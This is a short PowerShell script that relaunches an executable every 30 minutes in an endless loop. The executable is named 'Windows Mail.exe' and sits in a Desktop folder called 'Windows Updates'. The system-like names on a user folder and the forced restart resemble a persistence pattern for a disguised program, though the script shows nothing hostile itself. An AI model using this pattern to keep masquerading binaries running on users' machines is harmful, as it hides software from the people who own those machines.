While ($true) {
    Start-Process -FilePath "$($env:USERPROFILE)\Desktop\Windows Updates\Windows Mail.exe" | Out-Null
    Start-Sleep -Seconds 1800 # sleep for 30 minutes
}
